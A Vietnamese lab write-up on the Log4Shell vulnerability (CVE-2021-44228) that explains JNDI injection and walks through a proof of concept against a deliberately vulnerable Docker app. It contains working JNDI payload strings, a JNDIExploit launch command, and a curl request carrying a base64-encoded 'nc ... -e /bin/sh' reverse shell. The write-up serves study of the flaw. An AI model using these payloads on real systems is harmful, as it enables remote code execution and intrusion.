# Nghiên cứu lỗ hổng Log4shell

**1. Mã khai thác**

```
${jndi:ldap://127.0.0.1:1389/Run}
```

**2. Mô tả lỗi**

   - *Apache Log4j 2* là một thư viện Java phổ biến hỗ trợ việc log error messages của ứng dụng.

   - Log4shell là lỗ hổng phần mềm của *Apache Log4j 2* được published lần đầu với CVE-2021-44228, với nguyên nhân chủ yếu là do Improper Input Validation, cho phép remote attacker có thể chiếm quyền kiểm soát thiết bị trên Internet nếu thiết bị đó chạy Log4j 2.

   - Ở CVE-2021-44228, log4j phiên bản 2.0 tới 2.14.1 bị ảnh hưởng.

   - JNDI (Java Naming and Directory Interface)

     ![image-20220317142455864](image\image-20220317142455864.png)

     - JNDI cung cấp API cho ứng dụng để tương tác với LDAP, RMI,... Thông thường app Java sẽ không thể trực tiếp gửi request tới LDAP. 

   - Log4j có một tính năng dẫn tới lỗ hổng này, đó chính là tính năng lookup. Tính năng này được trigger bởi một chuỗi string đặc thù `${prefix:name}` . Thay vì in ra cả chuỗi ký tự này, đoạn string này sẽ được Log4j tiến hành lookup() .

     ![image-20220317153557009](image\image-20220317153557009.png)

   - Root cause của Log4shell nằm ở tính năng lookup() của JNDI, dẫn tới việc attacker tiến hành JNDI injection. 2 giao thức được hỗ trợ chủ yếu bởi JNDI là LDAP và RMI, khi thực hiện lookup() đều trả về 1 object. 

   - Đối với JNDI Injection, ta sẽ có 2 cách để tiến hành khai thác:

     - Deserialization exploit:![image-20220327154523522](image\image-20220327154523522.png)

       Đối với cách khai thác này, attacker có thể chèn mã độc với định dạng `${jndi:ldap://attacker/exploit}`, khi đoạn mã độc được log lại tại server nạn nhân, Log4j tìm thấy đoạn message và bắt đầu thực hiện request JNDI tới LDAP server  của `attacker` về `exploit` object. JNDI sẽ tiến hành lookup class mã độc tại LDAP server . LDAP sẽ trả về server nạn nhận một malicious serialized object, server nạn nhân sẽ tiến hành deserialize object, thực thi file `exploit.class` `->` Dẫn tới RCE. 

       ![image-20220317164249797](image\image-20220317164249797.png)

     - JNDI Reference: Đối với cách khai thác JNDI Reference, attacker sẽ sử dụng 1 LDAP server và 1 HTTP server, sau khi chèn mã độc `${jndi:ldap://attacker/exploit}`, đoạn mã được log tại server nạn nhân, log4j tìm thấy đoạn mã này và tiến hành jndi lookup như kịch bản trên. JNDI sẽ gửi request tới LDAP server của attacker và được LDAP server trả về 1 JNDI reference, server nạn nhận nhận được JNDI reference này sẽ gửi request tới HTTP server của attacker để GET về file `exploit.class` và tiến hành thực thi mã độc này.

       ![image-20220327160154306](image\image-20220327160154306.png)

   - POC cho JNDI Reference exploit:

     ![image-20220324234506235](image\image-20220324234506235.png)

     - Step 1: Chạy vuln app tại `192.168.16.105:8080`.

       ```
       docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
       ```

     - Step 2: Sử dụng JNDIExploit để khởi chạy malicious LDAP server và HTTP server.

       ```
       java -jar JNDIExploit-1.2-SNAPSHOT.jar -i attackerIP -p 8888
       ```

     - Step 3: Tại máy attacker, một cửa sổ bật ncat, 1 cửa sổ sử dụng tiến hành gửi request có chứa đoạn mã độc để kích hoạt reverse shell.

       ```
       curl 192.168.16.105:8080 -H 'X-Api-Version: ${jndi:ldap://attackerIP:1389/Basic/Command/Base64/bmMgMTcyLjMwLjE3OC44NyA0NDQ0IC1lIC9iaW4vc2g=}'
       ```

     - Step 4: Đoạn mã độc được log tại server nạn nhân, tiến hành JNDI lookup() với giao thức LDAP tới LDAP server attacker, tại đây các parameter trong URL được xử lý, cụ thể là Command được mã hóa Base64 được encode thành `nc 172.30.178.87 4444 -e /bin/sh`, và được gửi tới HTTP server của attacker, tại đây 1 file `exploit.class` được gen ra dựa trên Command được gửi tới từ LDAP server, server nạn nhân tiến hành GET file `exploit.class` và thực thi file, attacker lấy được shell tới server nạn nhân.

